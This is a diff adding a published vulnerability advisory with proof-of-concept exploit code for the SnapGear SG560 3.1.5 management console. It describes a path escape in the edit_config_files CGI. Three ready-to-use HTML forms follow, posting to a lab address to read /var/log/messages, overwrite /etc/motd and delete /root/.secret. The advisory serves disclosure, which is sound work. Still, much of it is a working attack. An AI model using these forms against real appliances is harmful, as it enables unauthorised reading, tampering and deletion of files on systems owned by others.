@@ -1,0 +1,95 @@
+# Title: Secure Computing SnapGear Management Console SG560 3.1.5 - Arbitrary File Read
+# Author:LiquidWorm
+# Date: 2020-06-04
+# Vendor: http://www.securecomputing.com
+# CVE:  N/A
+
+Secure Computing SnapGear Management Console SG560 v3.1.5 Arbitrary File Read/Write
+
+
+Vendor: Secure Computing Corp.
+Product web page: http://www.securecomputing.com
+Affected version: 3.1.5u1
+
+Summary: The SG gateway appliance range provides Internet security and
+privacy of communications for small and medium enterprises, and branch 
+offices. It simply and securely connects your office to the Internet,
+and with its robust stateful firewall, shields your computers from
+external threats.
+
+Desc: The application allows the currently logged-in user to edit the
+configuration files in the system using the CGI executable 'edit_config_files'
+in /cgi-bin/cgix/. The files that are allowed to be modified (read/write/delete)
+are located in the /etc/config/ directory. An attacker can manipulate
+the POST request parameters to escape from the restricted environment
+by using absolute path and start reading, writing and deleting arbitrary
+files on the system.
+
+Tested on: fnord/1.9
+           Apache 1.3.27 (Unix)
+           Linux 2.4.31
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5568
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5568.php
+
+
+14.05.2020
+
+--
+
+
+Read:
+-----
+<html>
+  <body>
+    <form action="http://10.0.2.2/cgi-bin/cgix/edit_config_files" method="POST">
+      <input type="hidden" name=".form" value="choices" />
+      <input type="hidden" name=".page" value="select_file" />
+      <input type="hidden" name="name$1337" value="/var/log/messages" />
+      <input type="hidden" name="modify$1337" value="1" />
+      <input type="hidden" name=".defaultname" value="newitem" />
+      <input type="submit" value="Read" />
+    </form>
+  </body>
+</html>
+
+
+Write/overwrite/move:
+---------------------
+<html>
+  <body>
+    <form action="http://10.0.2.2/cgi-bin/cgix/edit_config_files" method="POST">
+      <input type="hidden" name=".form" value="edit" />
+      <input type="hidden" name=".page" value="edit_file" />
+      <input type="hidden" name="enabled$0" value="" />
+      <input type="hidden" name="name$0" value="/etc/motd" />
+      <input type="hidden" name="mode$0" value="" />
+      <input type="hidden" name="filename" value="/etc/motd" />
+      <input type="hidden" name="filecontents" value="pwned" />
+      <input type="hidden" name="finish" value="Finish" />
+      <input type="hidden" name=".defaultname" value="finish" />
+      <input type="submit" value="Write" />
+    </form>
+  </body>
+</html>
+
+
+Delete:
+-------
+<html>
+  <body>
+    <form action="http://10.0.2.2/cgi-bin/cgix/edit_config_files" method="POST">
+      <input type="hidden" name=".form" value="choices" />
+      <input type="hidden" name=".page" value="select_file" />
+      <input type="hidden" name="name$251" value="/root/.secret" />
+      <input type="hidden" name="delete$251" value="1" />
+      <input type="hidden" name=".defaultname" value="newitem" />
+      <input type="submit" value="Delete" />
+    </form>
+  </body>
+</html>
